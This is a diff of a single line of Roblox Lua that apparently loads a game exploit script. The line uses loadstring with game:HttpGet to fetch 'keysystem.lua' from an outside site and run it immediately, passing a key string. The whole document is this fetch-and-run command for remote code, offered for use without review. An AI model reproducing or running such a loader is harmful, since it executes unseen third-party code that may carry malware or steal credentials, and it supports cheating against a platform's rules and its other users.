@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://robloxscripts.co.uk/keysystem.lua'))('FptkdRqW')
